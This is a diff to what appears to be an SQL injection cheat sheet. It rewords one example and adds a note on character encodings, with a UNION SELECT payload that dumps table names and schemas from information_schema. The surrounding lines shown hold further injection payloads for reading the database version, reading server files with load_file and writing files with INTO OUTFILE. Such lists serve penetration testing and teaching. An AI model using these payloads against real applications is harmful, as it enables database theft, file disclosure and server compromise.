@@ -86,7 +86,7 @@ General select syntax:
 UniOn selEct [number of columns] [comment]
 ```
 
-Example: Assume that there are 2 columns and column 2 can be used to display data on screen.
+Example: Assume that there are two columns and the second column can be used to display data from db.
 ```
 Seleting database version:
 UniOn selEct 1,version() /*
@@ -111,6 +111,13 @@ UniOn selEct 1,load_file('file location') /*
 
 Writing files:
 UniOn selEct null,[file content] inTo outfile '/location/to/write/file/to' /*
+```
+Notes:<br />
+When you executing queries you need to consider encodings.<br />
+
+Example of encoding query to utf8:
+```
+UniOn select table_name COLLATE utf8_general_ci,table_schema COLLATE utf8_general_ci,'1' from information_schema.tables
 ```
 
 SQL Map
